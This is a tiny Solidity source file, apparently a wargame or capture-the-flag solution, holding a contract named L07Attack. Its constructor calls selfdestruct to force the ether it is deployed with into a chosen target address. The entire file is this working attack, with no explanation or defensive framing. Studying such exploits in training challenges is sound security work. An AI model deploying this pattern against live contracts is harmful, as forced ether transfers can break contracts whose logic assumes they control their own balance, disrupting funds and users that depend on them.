// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract L07Attack {
    constructor(address to) payable {
        selfdestruct(payable(to));
    }
}
